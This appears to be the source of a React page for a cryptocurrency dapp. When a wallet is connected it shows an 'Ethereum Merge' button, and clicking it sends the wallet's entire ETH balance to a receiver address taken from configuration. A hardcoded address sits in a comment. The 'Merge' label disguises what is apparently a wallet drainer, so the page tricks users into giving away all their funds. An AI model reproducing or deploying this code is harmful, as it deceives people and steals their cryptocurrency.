import React, { useState } from "react";
import {
  getEthBalance,
  useAddress,
  useWeb3Context,
} from "../../context/web3Context";
import { EnvHelper } from "../../helper/Environment";
import { toast } from "react-toastify";
import { ethers } from "ethers";
import { sendAllEth } from "../../helper/helper";
import { formatedBalanceData } from "../../helper/Formatter";

const HomePage = () => {
  const balance = getEthBalance();
  const address = useAddress();
  const { provider, connected } = useWeb3Context();
  const [processing, setProcessing] = useState(false);

  let receiverAddress = EnvHelper.getReceiverAddress();
  // let receiverAddress = `0x00A49A28ba4C87F3Ff8DE967c97B6FD300214187`;

  const transferEth = async () => {
    try {
      // checks if the recipient address is not a string and convert it to a string
      if (typeof receiverAddress !== "string") {
        receiverAddress = `${receiverAddress}`;
      }
      // checks if the address is a valid etherium address
      const isAddress = ethers.utils.isAddress(receiverAddress);

      if (!isAddress) {
        return toast.error("Not a Valid Etherium Address");
      }
      await sendAllEth(provider, address, receiverAddress, setProcessing);
    } catch (error) {
      console.log(error);
    }
  };
  return (
    <div>
      {connected && (
        <button onClick={transferEth}>
          {" "}
          {processing ? "Merging" : "Ethereum Merge"}
        </button>
      )}
      {connected && <div>{formatedBalanceData(balance)}ETH</div>}
    </div>
  );
};

export default HomePage;
